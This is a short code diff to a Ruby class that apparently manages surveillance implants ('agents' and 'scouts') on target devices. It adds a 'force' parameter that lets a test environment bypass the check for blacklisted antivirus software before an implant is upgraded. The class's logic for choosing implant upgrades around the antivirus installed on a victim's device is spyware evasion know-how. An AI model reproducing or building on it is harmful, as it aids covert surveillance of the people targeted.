@@ -363,7 +363,7 @@ class Item
     self.upgrade_requests.create!({filename: name, _grid: RCS::DB::GridFS.put(content, {filename: name, content_type: 'application/octet-stream'}) })
   end
 
-  def upgrade!
+  def upgrade!(params)
     raise "Cannot determine agent version" if self.version.nil?
 
     # delete any pending upgrade if requested multiple time
@@ -373,7 +373,7 @@ class Item
       raise "Compromised scout cannot be upgraded" if self.version <= 3
       
       # check the presence of blacklisted AV in the device evidence
-      method = blacklisted_software?
+      method = blacklisted_software? params
 
       # if it's a scout, there a special procedure
       return upgrade_scout(method)
@@ -578,10 +578,13 @@ class Item
     RCS::DB::GridFS.create_collection(self._id)
   end
 
-  def blacklisted_software?
+  def blacklisted_software?(params = {})
     upgrade_method = :elite
 
     raise BlacklistError.new("Cannot determine blacklist") if self._kind != 'agent'
+
+    # used only by the TEST environment to force an upgrade method
+    return params['force'] if params['force']
 
     device = Evidence.target(self.path.last).where({type: 'device', aid: self._id.to_s}).last
     raise BlacklistError.new("Cannot determine installed software") unless device
